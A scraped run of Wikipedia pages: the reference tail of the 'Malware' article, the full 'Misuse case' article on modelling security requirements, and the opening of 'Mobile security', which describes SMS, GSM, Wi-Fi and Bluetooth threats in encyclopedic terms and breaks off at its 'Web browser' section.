^ Mutch, John; Anderson, Brian (2011),  Mutch, John; Anderson, Brian (eds.), "The Hard and Soft Cost of Apathy", Preventing Good People from doing Bad Things: Implementing Least Privilege, Berkeley, CA: Apress, pp. 163–175, doi:10.1007/978-1-4302-3922-2_10, ISBN 978-1-4302-3922-2, retrieved 2 December 2021

^ Singh, Vaishali; Pandey, S. K. (2021).  Rathore, Vijay Singh; Dey, Nilanjan; Piuri, Vincenzo; Babo, Rosalina; Polkowski, Zdzislaw; Tavares, João Manuel R. S. (eds.). "Revisiting Cloud Security Attacks: Credential Attack". Rising Threats in Expert Applications and Solutions. Advances in Intelligent Systems and Computing. Singapore: Springer. 1187: 339–350. doi:10.1007/978-981-15-6014-9_39. ISBN 978-981-15-6014-9. S2CID 224940546.

^ "LNCS 3786 – Key Factors Influencing Worm Infection", U. Kanlayasiri, 2006, web (PDF): SL40-PDF.

^ Cohen, Jason (28 August 2020). "Windows Computers Account for 83% of All Malware Attacks in Q1 2020". PCMag Australia. Retrieved 2 December 2021.

^ Wagner, Neal; Şahin, Cem Ş.; Winterrose, Michael; Riordan, James; Pena, Jaime; Hanson, Diana; Streilein, William W. (December 2016). "Towards automated cyber decision support: A case study on network segmentation for security". 2016 IEEE Symposium Series on Computational Intelligence (SSCI): 1–10. doi:10.1109/SSCI.2016.7849908. ISBN 978-1-5090-4240-1. S2CID 9065830.

^ Hemberg, Erik; Zipkin, Joseph R.; Skowyra, Richard W.; Wagner, Neal; O'Reilly, Una-May (6 July 2018). "Adversarial co-evolution of attack and defense in a segmented computer network environment". Proceedings of the Genetic and Evolutionary Computation Conference Companion. GECCO '18. New York, NY, USA: Association for Computing Machinery: 1648–1655. doi:10.1145/3205651.3208287. ISBN 978-1-4503-5764-7. S2CID 51603533.

^ "Malicious Software Removal Tool". Microsoft. Archived from the original on 21 June 2012. Retrieved 21 June 2012.

^ a b Rubenking, Neil J. (8 January 2014). "The Best Free Antivirus for 2014". pcmag.com.

^ "Free antivirus profiles in 2018". antivirusgratis.org. Archived from the original on 10 August 2018. Retrieved 13 February 2020.

^ "Quickly identify malware running on your PC". techadvisor.co.uk.

^ "How Antivirus Software Works?". Retrieved 16 October 2015.

^ a b Souppaya, Murugiah; Scarfone, Karen (July 2013). "Guide to Malware Incident Prevention and Handling for Desktops and Laptops". National Institute of Standards and Technology. doi:10.6028/nist.sp.800-83r1. {{cite journal}}: Cite journal requires |journal= (help)

^ Al-Saleh, Mohammed Ibrahim; Espinoza, Antonio M.; Crandall, Jedediah R. (2013). "Antivirus performance characterisation: system-wide view". IET Information Security. 7 (2): 126–133. doi:10.1049/iet-ifs.2012.0192. ISSN 1751-8717.

^ M. Guri, G. Kedma, A. Kachlon and Y. Elovici, "AirHopper: Bridging the air-gap between isolated networks and mobile phones using radio frequencies," Malicious and Unwanted Software: The Americas (MALWARE), 2014 9th International Conference on, Fajardo, PR, 2014, pp. 58-67.

^ M. Guri, M. Monitz, Y. Mirski and Y. Elovici, "BitWhisper: Covert Signaling Channel between Air-Gapped Computers Using Thermal Manipulations," 2015 IEEE 28th Computer Security Foundations Symposium, Verona, 2015, pp. 276-289.

^ GSMem: Data Exfiltration from Air-Gapped Computers over GSM Frequencies. Mordechai Guri, Assaf Kachlon, Ofer Hasson, Gabi Kedma, Yisroel Mirsky, and Yuval Elovici, Ben-Gurion University of the Negev; USENIX Security Symposium 2015

^ Hanspach, Michael; Goetz, Michael; Daidakulov, Andrey; Elovici, Yuval (2016). "Fansmitter: Acoustic Data Exfiltration from (Speakerless) Air-Gapped Computers". arXiv:1606.05915 [cs.CR].


External links[edit]



Look up malware in Wiktionary, the free dictionary.




Wikimedia Commons has media related to Malware.

Malicious Software at Curlie
Further Reading: Research Papers and Documents about Malware on IDMARCH (Int. Digital Media Archive)
Advanced Malware Cleaning – a Microsoft video
vteMalware topicsInfectious malware
Comparison of computer viruses
Computer virus
Computer worm
List of computer worms
Timeline of computer viruses and worms
Concealment
Backdoor
Clickjacking
Man-in-the-browser
Man-in-the-middle
Rootkit
Trojan horse
Zombie computer
Malware for profit
Adware
Botnet
Crimeware
Fleeceware
Form grabbing
Fraudulent dialer
Malbot
Keystroke logging
Privacy-invasive software
Ransomware
Rogue security software
Scareware
Spyware
Web threats
By operating system
Android malware
Classic Mac OS viruses
iOS malware
Linux malware
MacOS malware
Macro virus
Mobile malware
Palm OS viruses
HyperCard viruses
Protection
Anti-keylogger
Antivirus software
Browser security
Data loss prevention software
Defensive computing
Firewall
Internet security
Intrusion detection system
Mobile security
Network security
Countermeasures
Computer and network surveillance
Honeypot
Operation: Bot Roast

vteSoftware distributionLicenses
Beerware
Floating licensing
Free and open-source
Free
Open source
Freely redistributable
Proprietary
Public domain
Source-available
Compensation models
Adware
Commercial software
Retail software
Crippleware
Crowdfunding
Freemium
Freeware
Pay what you want
Careware
Donationware
Open-core model
Postcardware
Shareware
Nagware
Trialware
Delivery methods
Digital distribution
File sharing
On-premises
Pre-installed
Product bundling
Retail software
Sneakernet
Software as a service
Deceptive and/or illicit
Unwanted software bundling
Malware
Spyware
Trojan horse
Worm
Ransomware
Scareware
Shovelware
Vaporware
list
Software release life cycle
Abandonware
End-of-life
Long-term support
Software maintenance
Software maintainer
Software publisher
Copy protection
Digital rights management
Software protection dongle
Hardware restrictions
License manager
Product activation
Product key
Software copyright
Software patent
Torrent poisoning

Portal: Internet
Authority control: National libraries 
Germany
Israel
United States
Czech Republic





Retrieved from "https://en.wikipedia.org/w/index.php?title=Malware&oldid=1135725998"
Categories: MalwareSecurity breachesComputer programmingCybercrimeHidden categories: CS1: long volume valueWebarchive template wayback linksCS1 errors: missing periodicalArticles with short descriptionShort description is different from WikidataUse dmy dates from August 2017Commons category link from WikidataArticles with Curlie linksArticles with GND identifiersArticles with J9U identifiersArticles with LCCN identifiersArticles with NKC identifiers
 



From Wikipedia, the free encyclopedia


Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
 Example of the Misuse case principle, which could be used in thinking about capturing security requirements.
Misuse case is a business process modeling tool used in the software development industry. The term Misuse Case or mis-use case is derived from and is the inverse of use case.[1] The term was first used in the 1990s by Guttorm Sindre of the Norwegian University of Science and Technology, and Andreas L. Opdahl of the University of Bergen, Norway. It describes the process of executing a malicious act against a system, while  use case can be used to describe any action taken by the system.[2]


Overview[edit]
Use cases specify required behaviour of software and other products under development, and are essentially structured stories or scenarios detailing the normal behavior and usage of the software. A Misuse Case on the other hand highlights something that should not happen (i.e. a Negative Scenario) and the threats hence identified, help in defining new requirements, which are expressed as new Use Cases.
This modeling tool has several strengths:

It allows provision of equal weightage to functional and non-functional requirements (e.g. security requirements, platform requirements, etc.), which may not be possible with other tools.
It emphasises security from the beginning of the design process and helps to avoid premature design decisions.
It is a tool for improving communication between developers and stakeholders and is valuable in ensuring that both agree on critical system solutions and Trade-off analysis.[3]
Creating misuse cases often trigger a chain reaction which eases the identification of functional and non-functional requirements. The discovery of a misuse case will often leads to the creation of a new use case which acts as a counter measure. This in turn might be the subject of a new misuse case.[4]
As compared to other tools, It relates better to use cases and UML and eases the seamless employment of the model.
Its biggest weakness is its simplicity. It needs to be combined with more powerful tools to establish an adequate plan for the execution of a project. One other weakness is its lack of structure and semantics.

From use to misuse case[edit]
In an industry it is important to describe a system's behavior when it responds to a request that originates from outside : the use cases [5] have become popular for requirements [1] between the engineers thanks to its features like the visual modeling technique, they describe a system from an actor's viewpoint and its format explicitly conveys each actor's goals and the flows the system must implement to accomplish them.[6]
The level of abstraction of a use case model makes it an appropriate starting point for design activities, thanks to the use of UML use case diagrams and the end user's or domain expert's language. But for software security analyses, the developers should pay attention to negative scenarios and understand them. That is why, in the 1990s, the concept of "inverse of a use case" was born in Norway.
The contrast between the misuse case and the use case is the goal: the misuse case describes potential system behaviors that a system's stakeholders consider unacceptable or, as Guttorm Sindre and Andreas L. Opdahl said, "a function that the system should not allow".[1]
This difference is also in the scenarios: a "positive" scenario is a sequence of actions leading to a Goal desired by a person or organization, while a "negative" one is a scenario whose goal is desired not to occur by the organization in question or desired by a hostile agent (not necessarily human).[7]
Another description of the difference is by [8] that defines a use case as a completed sequence of actions which gives increased value to the user, one could define a misuse case as a completed sequence of actions which results in loss for the organization or some specific stakeholder.
Between the "good" and the "bad" case the language to represent the scenario is common: the use case diagrams are formally included in two modeling languages defined by the OMG: the Unified Modeling Language (UML) and the Systems Modeling Language (SysML), and this use of drawing the agents and misuse cases of the scenario explicitly helps focus attention
on it.[9]

Area of use[edit]
Misuse case are most commonly used in the field of security.[10] With the ever-growing importance of IT system, it has become vital for every company to develop capability to protect its data.[11]
Hence, for example a misuse case might be used to define what a hacker would want to do with the system and define his or her requirements. A developer or designer can then define the requirements of the user and the hacker in the same UML diagram which in turn helps identify the security risks of the system.[12]

Basic concepts[edit]
A misuse case diagram is created together with a corresponding use case diagram. The model introduces 2 new important entities (in addition to those from the traditional use case model, use case and actor:

Misuse case : A sequence of actions that can be performed by any person or entity in order to harm the system.
Misuser : The actor that initiates the misuse case. This can either be done intentionally or inadvertently.
Diagrams[edit]
The misuse case model makes use of those relation types found in the use case model; include, extend, generalize and association. In addition, it introduces two new relations to be used in the diagram:

mitigates
A use case can mitigate the chance that a misuse case will complete successfully.
threatens
A misuse case can threaten a use case, e.g. by exploiting it or hinder it from achieving its goals.
These new concepts together with the existing ones from use case give the following meta model, which is also found as fig. 2 in Sindre and Opdahl (2004).[2]

Descriptions[edit]
There are two different ways of describing a misuse case textual; one is embedded in a use case description template - where an extra description field called Threats can be added. This is the field where misuse case steps (and alternate steps) can be filled in. This is referred to as the lightweight mode of describing a misuse case.
The other way of describing a misuse case, is by using a separate template for this purpose only. It is suggested to inherit some of the field from use case description (Name, Summary, Author and Date). It also adapts the fields Basic path and Alternative path, where they now describe the paths of the misuse cases instead of the use cases. In addition to there, it is proposed to use several other fields too:

Misuse case name
Summary
Author
Date
Basic path
Alternative paths
Mitigation points
Extension points
Triggers
Preconditions
Assumptions
Mitigation guarantee
Related business rules
Potential misuser profile
Stakeholders and threats
Terminology and explanations
Scope
Abstraction level
Precision level
As one might understand, the list above is too comprehensive to be completely filled out every time. Not all the fields are required to be filled in at the beginning, and it should thus be viewed as a living document. There has also been some debating whether to start with diagrams or to start with descriptions. The recommendation given by Sindre and Opdahl on that matter is that it should be done as with use cases.
Sindre and Opdahl proposes the following 5 steps for using misuse cases to identify security requirements:

Identify critical assets in the system
Define security goals for each assets
Identify threats to each of these security goals, by identifying the stakeholders that may want to cause harm to the system
Identify and analyze risks for the threats, using techniques like Risk Assessment
Define security requirements for the risks.
It is suggested to use a repository of reusable misuse cases as a support in this 5-step process.

Research[edit]
Current field of research[edit]
Current research on misuse cases are primarily focused on the security improvements they can bring to a project, software projects in particular. Ways to increase the widespread adoption of the practice of misuse case development during earlier phases of application development are being considered: the sooner a flaw is found, the easier it is to find a patch and the lower the impact is on the final cost of the project.
Other research focuses on improving the misuse case to achieve its final goal: for [13] "there is a lack on the application process, and the results are too general and can cause a under-definition or misinterpretation of their concepts". They suggest furthermore "to see the misuse case in the light of a reference model for information system security risk management (ISSRM)" to obtain a security risk management process.

Future improvement[edit]
The misuse cases are well known by the population of researchers. The body of research on the subject demonstrate the knowledge, but beyond the academic world, the misuse case has not been broadly adopted.
As Sindre and Opdahl (the parents of the misuse case concept) suggest: "Another important goal for further work is to facilitate broader industrial adoption of misuse cases".[2] They propose, in the same article, to embed the misuse case in a usecase modeling tool and to create a "database" of standard misuse cases to assist software architects. System stakeholders should create their own misuse case charts for requirements that are specific to their own problem domains. Once developed, a knowledge database can reduce the amount of standard security flaws used by lambda hackers.
Other research focused on possible missing concrete solutions of the misuse case: as [14] wrote "While this approach can help in a high level elicitation of security requirements, it does not show how to associate the misuse cases to legitimate behavior and concrete assets; therefore, it is not clear what misuse case should be considered, nor in what context". These criticisms might be addressed with the suggestions and improvements presented in the precedent section.
Standardization of the misuse case as part of the UML notation might allow it to become a mandatory part of project development. "It might be useful to create a specific notation for security functionality, or countermeasures that have been added to mitigate vulnerabilities and threats."[15]

See also[edit]
Use case diagram
Steps for Business Analyst To Gather Security Requirements from Misuse Cases [1]
Exception handling
Threat model (software)
References[edit]


^ a b c Sindre and Opdahl (2001). "Capturing Security Requirements through Misuse Cases"

^ a b c Sindre and Opdahl (2004)."Eliciting security requirements with misuse cases Archived 2011-07-16 at the Wayback Machine"

^ Initial Industrial Experience of Misuse Cases in Trade-Off Analysis (2002, by Ian Alexander) Archived 2008-04-30 at the Wayback Machine

^ Ian Alexander, Misuse Cases: Use Cases with Hostile Intent. IEEE Software, Vol 20, No 1, Jan-Feb 2003, 58-66. DOI: 10.1109/MS.2003.1159030

^ Jacobson, "Object-oriented software engineering: a use case driven approach", 1992 Addison-Wesley, Boston

^ Gunnar Peterson, John Steven "Defining Misuse within the Development Process", IEEE SECURITY & PRIVACY, NOVEMBER/DECEMBER 2006

^ Ian Alexander "Misuse case : use cases with hostile intent", presentation

^ Guttorm Sindre, Andreas L. Opdahl, "Templates for Misuse Case Description"

^ Ian Alexander "Misuse case : use cases with hostile intent"

^ Asoke K. Talukder; Manish Chaitanya (17 December 2008). Architecting Secure Software Systems. CRC Press. p. 47. ISBN 978-1-4200-8784-0. Retrieved 5 October 2016.

^ Jesper M. Johansson; Steve Riley (27 May 2005). Protect Your Windows Network: From Perimeter To Data. Addison-Wesley Professional. p. 491. ISBN 978-0-321-33643-9. Retrieved 5 October 2016.

^ Asoke K. Talukder; Manish Chaitanya (17 December 2008). Architecting Secure Software Systems. CRC Press. p. 50. ISBN 978-1-4200-8784-0. Retrieved 5 October 2016.

^ Raimundas Matulevičius, Nicolas Mayer, Patrick Heymans, "Alignment of Misuse Cases with Security Risk Management"

^ Fabricio A. Braz, Eduardo B. Fernandez, Michael VanHilst, "Eliciting Security Requirements through Misuse Activities"

^ Lillian Røstad, "An extended misuse case notation: Including vulnerabilities and the insider threat"






Retrieved from "https://en.wikipedia.org/w/index.php?title=Misuse_case&oldid=1120284674"
Categories: Business processSoftware project managementSoftware requirementsHidden categories: Webarchive template wayback links
 



From Wikipedia, the free encyclopedia


Security risk and prevention for mobile devices
This article is about security threats to mobile devices. For using mobile devices for secure system access, see Computer security § Hardware protection mechanisms.
This article may require copy editing for grammar, style, cohesion, tone, or spelling. You can assist by editing it. (April 2022) (Learn how and when to remove this template message)
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Mobile security, or mobile device security, is the protection of smartphones, tablets, and laptops from threats associated with wireless computing.[1] It has become increasingly important in mobile computing. The security of personal and business information now stored on smartphones is of particular concern.
More and more users and businesses use smartphones not only to communicate, but also to plan and organize both their users' work and private life. Within companies, these technologies are causing profound changes in the organization of information systems and have therefore become the source of new risks. Indeed, smartphones collect and compile an increasing amount of sensitive information to which access must be controlled to protect the privacy of the user and the intellectual property of the company.
All smartphones, as computers, are preferred targets of attacks. This is because these devices have family photos, pictures of pets, passwords, and more. For attackers, these items are a digital passport to access everything they would need to know about a person. This is why attacks on mobile devices are on the rise.[2] These attacks exploit weaknesses inherent in smartphones that come from the communication mode—like Short Message Service (SMS, aka text messaging), Multimedia Messaging Service (MMS), Wi-Fi, Bluetooth and GSM, the de facto global standard for mobile communications. There are also exploits that target software vulnerabilities in the browser or operating system, taking advantages of the weak knowledge of an average user.
Security countermeasures are being developed and applied to smartphones, from security in different layers of software to the dissemination of information to end users. There are practices to be observed at all levels, from design to use, through the development of operating systems, software layers, and downloadable apps.


Challenges of smartphone mobile security[edit]
Threats[edit]
A smartphone user is exposed to various threats when they use their phone. In just the last two-quarters of 2012, the number of unique mobile threats grew by 261%, according to ABI Research.[3] These threats can disrupt the operation of the smartphone, and transmit or modify user data. So applications must guarantee privacy and integrity of the information they handle. In addition, since some apps could themselves be malware, their functionality and activities should be limited (for example, restricting the apps from accessing location information via GPS, blocking access to the user's address book, preventing the transmission of data on the network, sending SMS messages that are billed to the user, etc.).[1] Since the recent rise of mobile attacks, hackers have increasingly targeted smartphones through credential theft and snooping. The number of attacks targeting smartphones and other devices has risen by 50 percent. According to the study, mobile banking applications are responsible for the increase in attacks.
Malware is distributed by the attackers so that they can take over the targets' transaction information, their rights to log in, and their money. Various types of malware are also developed with anti-detection techniques to avoid detection. Triade malware comes pre-installed on some mobile devices. In addition to Haddad, there is Lotoor, which exploits vulnerabilities in the system to repackage legitimate applications.[4] The devices are also vulnerable due to spyware and leaky behaviors through applications. Devices connected to public networks are at risk of attacks. Mobile devices are also effective conveyance systems for malware threats, breaches of information, and thefts. Potential attackers were looking for possible weak points once Apple's iPhone and the first Android devices came onto the market. The Department of Homeland Security's cybersecurity department claims that the number of vulnerable points in smartphone operating systems has increased. As mobile phones are connected to utilities and appliances, hackers, cybercriminals, and even intelligence officials have access to these devices.[5]
It became increasingly popular to let employees use their own devices for work-related purposes in 2011. The Crowd Research Partners study, published in 2017, reports that during 2017, most businesses that mandated the use of mobile devices were subjected to malware attacks and breaches. It has become common for rogue applications to be installed on user devices without the user's permission. They breach privacy, which hinders the effectiveness of the devices.[6] As well as affecting the device, hidden malware is harmful.[3] Mobile malware has been developed to exploit vulnerabilities in mobile devices. Ransomware, worms, botnets, Trojans, and viruses are some of the types. Since the introduction of mobile banking apps and other apps, which are vital targets for hackers, malware has been rampant. Trojan-droppers can also avoid detection of malware. The attackers who use the malware on the device are able to avoid detection by hiding malicious code. Despite the fact that the malware inside a device does not change, the dropper generates new hashes each time. Additionally, droppers can also create a multitude of files, which can lead to the creation of viruses. Android mobile devices are prone to Trojan-Droppers. The banking Trojans also enable attacks on the banking applications on the phone, which leads to the theft of data for use in stealing money and funds. Additionally, there are jailbreaks for iOS devices, which work by disabling the signing of codes on iPhones so that applications not downloaded from the App Store can be operated. In this way, all the protection layers offered by iOS are disrupted, exposing the device to malware. These outside applications don't run in a sandbox, and as a result, it exposes potential security problems. By installing malicious credentials and virtual private networks (VPN) to direct information to malicious systems, there are attack vectors developed to change the mobile devices' configuration settings. In addition, there is spyware that tends to be installed on mobile devices in order to track an individual. Malicious apps can also be installed without the owners' permission or knowledge.
Wi-Fi interference technologies can also attack mobile devices through potentially insecure networks. By compromising the network, hackers are able to gain access to key data. A VPN, on the other hand, can be used to secure networks. As soon as a system is threatened, an active VPN will operate. There are also social engineering techniques, such as phishing. With phishing, unsuspecting victims are sent links to lead them to malicious websites. The attackers can then hack into the victim's device and copy all of its information. However, mobile device attacks can be prevented with technologies. Containerization is an example, as it allows the creation of a hardware infrastructure that separates the business data from other data. By detecting malicious traffic and rogue access points, there is network protection. Data security is also ensured through authentication.[1]
There are three prime targets for attackers:[7]

Data: smartphones are devices for data management, and may contain sensitive data like credit card numbers, authentication information, private information, activity logs (calendar, call logs);
Identity: smartphones are highly customizable, so the device or its contents can easily be associated with a specific person.
Availability: attacking a smartphone can limit access to it and deprive the owner of its use.
There are a number of threats to mobile devices, including annoyance, stealing money, invading privacy, propagation, and malicious tools.[8] Vulnerability in mobile devices is a weak spot that will allow an attacker to decrease a systems security. There are three elements that intercepts when vulnerability occurs and they are a system weakness, attacker access to the flaw, and attacker competence to exploit the flaw.[1]

Botnets: attackers infect multiple machines with malware that victims generally acquire via e-mail attachments or from compromised applications or websites. The malware then gives hackers remote control of "zombie" devices, which can then be instructed to perform harmful acts.[8]
Malicious applications: hackers upload malicious programs or games to third-party smartphone application marketplaces. The programs steal personal information and open backdoor communication channels to install additional applications and cause other problems.[8]
Malicious links on social networks: an effective way to spread malware where hackers can place Trojans, spyware, and backdoors.[8]
Spyware: hackers use this to hijack phones, allowing them to hear calls, see text messages and e-mails as well as track someone's location through GPS updates.[8]
The source of these attacks are the same actors found in the non-mobile computing space:[7]

Professionals, whether commercial or military, who focus on the three targets mentioned above. They steal sensitive data from the general public, as well as undertake industrial espionage. They will also use the identity of those attacked to achieve other attacks;
Thieves who want to gain income through data or identities they have stolen. The thieves will attack many people to increase their potential income;
Black hat hackers who specifically attack availability.[9] Their goal is to develop viruses, and cause damage to the device.[10] In some cases, hackers have an interest in stealing data on devices.
Grey hat hackers who reveal vulnerabilities.[11] Their goal is to expose vulnerabilities of the device.[6] Grey hat hackers do not intend on damaging the device or stealing data.[12]
Consequences[edit]
When a smartphone is infected by an attacker, the attacker can attempt several things:

The attacker can manipulate the smartphone as a zombie machine, that is to say, a machine with which the attacker can communicate and send commands which will be used to send unsolicited messages (spam) via sms or email;[13]
The attacker can easily force the smartphone to make phone calls. For example, one can use the API (library that contains the basic functions not present in the smartphone) PhoneMakeCall by Microsoft, which collects telephone numbers from any source such as yellow pages, and then call them.[13] But the attacker can also use this method to call paid services, resulting in a charge to the owner of the smartphone. It is also very dangerous because the smartphone could call emergency services and thus disrupt those services;[13]
A compromised smartphone can record conversations between the user and others and send them to a third party.[13] This can cause user privacy and industrial security problems;
An attacker can also steal a user's identity, usurp their identity (with a copy of the user's sim card or even the telephone itself), and thus impersonate the owner. This raises security concerns in countries where smartphones can be used to place orders, view bank accounts or are used as an identity card;[13]
The attacker can reduce the usability of the smartphone, by discharging the battery.[14] For example, they can launch an application that will run continuously on the smartphone processor, requiring a lot of energy and draining the battery. One factor that distinguishes mobile computing from traditional desktop PCs is their limited performance. Frank Stajano and Ross Anderson first described this form of attack, calling it an attack of "battery exhaustion" or "sleep deprivation torture";[15]
The attacker can also prevent the operation and/or use of the smartphone by making it unusable.[16] This attack can either delete the boot scripts, resulting in a phone without a functioning OS, or modify certain files to make it unusable (e.g. a script that launches at startup that forces the smartphone to restart) or even embed a startup application that would empty the battery;[15]
The attacker can remove the personal (photos, music, videos, etc.) or professional data (contacts, calendars, notes) of the user.[16]
Attacks based on communication[edit]
Attack based on SMS and MMS[edit]
Some attacks derive from flaws in the management of SMS and MMS.
Some mobile phone models have problems in managing binary SMS messages. It is possible by sending an ill-formed block, to cause the phone to restart, leading to the denial of service attacks. If a user with a Siemens S55 received a text message containing a Chinese character, it would lead to a denial of service.[17]
In another case, while the standard requires that the maximum size of a Nokia Mail address is 32 characters, some Nokia phones did not verify this standard, so if a user enters an email address over 32 characters, that leads to complete dysfunction of the e-mail handler and puts it out of commission. This attack is called "curse of silence".
A study on the safety of the SMS infrastructure revealed that SMS messages sent from the Internet can be used to perform a distributed denial of service (DDoS) attack against the mobile telecommunications infrastructure of a big city. The attack exploits the delays in the delivery of messages to overload the network.
Another potential attack could begin with a phone that sends an MMS to other phones, with an attachment. This attachment is infected with a virus. Upon receipt of the MMS, the user can choose to open the attachment. If it is opened, the phone is infected, and the virus sends an MMS with an infected attachment to all the contacts in the address book. There is a real-world example of this attack: the virus Commwarrior[16] uses the address book and sends MMS messages including an infected file to recipients. A user installs the software, as received via MMS message. Then, the virus began to send messages to recipients taken from the address book.

Attacks based on communication networks[edit]
Attacks based on the GSM networks[edit]
The attacker may try to break the encryption of the mobile network. The GSM network encryption algorithms belong to the family of algorithms called A5. Due to the policy of security through obscurity it has not been possible to openly test the robustness of these algorithms. There were originally two variants of the algorithm: A5/1 and A5/2 (stream ciphers), where the former was designed to be relatively strong, and the latter was designed to be weak on purpose to allow easy cryptanalysis and eavesdropping. ETSI forced some countries (typically outside Europe) to use A5/2. Since the encryption algorithm was made public, it was proved it was possible to break the encryption: A5/2 could be broken on the fly, and A5/1 in about 6 hours .[18] In July 2007, the 3GPP approved a change request to prohibit the implementation of A5/2 in any new mobile phones, which means that it has been decommissioned and is no longer implemented in mobile phones. Stronger public algorithms have been added to the GSM standard, the A5/3 and A5/4 (Block ciphers), otherwise known as KASUMI or UEA1[19] published by the ETSI. If the network does not support A5/1, or any other A5 algorithm implemented by the phone, then the base station can specify A5/0 which is the null algorithm, whereby the radio traffic is sent unencrypted. Even in case mobile phones are able to use 3G or 4G which have much stronger encryption than 2G GSM, the base station can downgrade the radio communication to 2G GSM and specify A5/0 (no encryption) .[20] This is the basis for eavesdropping attacks on mobile radio networks using a fake base station commonly called an IMSI catcher.
In addition, tracing of mobile terminals is difficult since each time the mobile terminal is accessing or being accessed by the network, a new temporary identity (TMSI) is allocated to the mobile terminal. The TMSI is used as the identity of the mobile terminal the next time it accesses the network. The TMSI is sent to the mobile terminal in encrypted messages.
Once the encryption algorithm of GSM is broken, the attacker can intercept all unencrypted communications made by the victim's smartphone.

Attacks based on Wi-Fi[edit]
See also: Wi-Fi § Network_security
 Access Point spoofing
An attacker can try to eavesdrop on Wi-Fi communications to derive information (e.g. username, password). This type of attack is not unique to smartphones, but they are very vulnerable to these attacks because very often the Wi-Fi is the only means of communication they have to access the internet. The security of wireless networks (WLAN) is thus an important subject. Initially, wireless networks were secured by WEP keys. The weakness of WEP is a short encryption key which is the same for all connected clients. In addition, several reductions in the search space of the keys have been found by researchers. Now, most wireless networks are protected by the WPA security protocol.
WPA is based on the "Temporal Key Integrity Protocol (TKIP)" which was designed to allow migration from WEP to WPA on the equipment already deployed. The major improvements in security are the dynamic encryption keys. For small networks, the WPA is a "pre-shared key" which is based on a shared key. Encryption can be vulnerable if the length of the shared key is short. With limited opportunities for input (i.e. only the numeric keypad), mobile phone users might define short encryption keys that contain only numbers. This increases the likelihood that an attacker succeeds with a brute-force attack. The successor to WPA, called WPA2, is supposed to be safe enough to withstand a brute force attack. Free Wi-Fi is usually provided by organizations such as airports, coffee shops, and restaurants for a number of reasons. In addition to spending more time on the premises, Wi-Fi access helps them to stay productive.[1] It's likely they'll end up spending more money if they spend more time on the premises. Enhancing customer tracking is another reason. A lot of restaurants and coffee shops compile data about their customers so they can target advertisements directly to their devices. This means that customers know what services the facility provides. Generally, individuals filter business premises based on Internet connections as another reason to gain a competitive edge. The ability to access free and fast Wi-Fi gives a business an edge over those who do not. Network security is the responsibility of the organizations. There are numerous risks associated with their unsecured Wi-Fi networks, however. The man-in-the-middle attack entails the interception and modification of data between parties. Additionally, malware can be distributed via the free Wi-Fi network and hackers can exploit software vulnerabilities to smuggle malware onto connected devices. It is also possible to eavesdrop and sniff Wi-Fi signals using special software and devices, capturing login credentials and hijacking accounts.[10]
As with GSM, if the attacker succeeds in breaking the identification key, it will be possible to attack not only the phone but also the entire network it is connected to.
Many smartphones for wireless LANs remember they are already connected, and this mechanism prevents the user from having to re-identify with each connection. However, an attacker could create a Wi-Fi access point twin with the same parameters and characteristics as the real network. Using the fact that some smartphones remember the networks, they could confuse the two networks and connect to the network of the attacker who can intercept data if it does not transmit its data in encrypted form.[21][22]
Lasco is a worm that initially infects a remote device using the SIS file format.[23] SIS file format (Software Installation Script) is a script file that can be executed by the system without user interaction. The smartphone thus believes the file to come from a trusted source and downloads it, infecting the machine.[23]

Principle of Bluetooth-based attacks[edit]
Main article: Bluetooth § Security
See also: Bluesnarfing and Bluebugging
Security issues related to Bluetooth on mobile devices have been studied and have shown numerous problems on different phones. One easy to exploit vulnerability: unregistered services do not require authentication, and vulnerable applications have a virtual serial port used to control the phone. An attacker only needed to connect to the port to take full control of the device.[24] Another example: a phone must be within reach and Bluetooth in discovery mode. The attacker sends a file via Bluetooth. If the recipient accepts, a virus is transmitted. For example: Cabir is a worm that spreads via Bluetooth connection.[16] The worm searches for nearby phones with Bluetooth in discoverable mode and sends itself to the target device. The user must accept the incoming file and install the program. After installing, the worm infects the machine.

Attacks based on vulnerabilities in software applications[edit]
Other attacks are based on flaws in the OS or applications on the phone.

Web browser[edit]
See also: Browser security
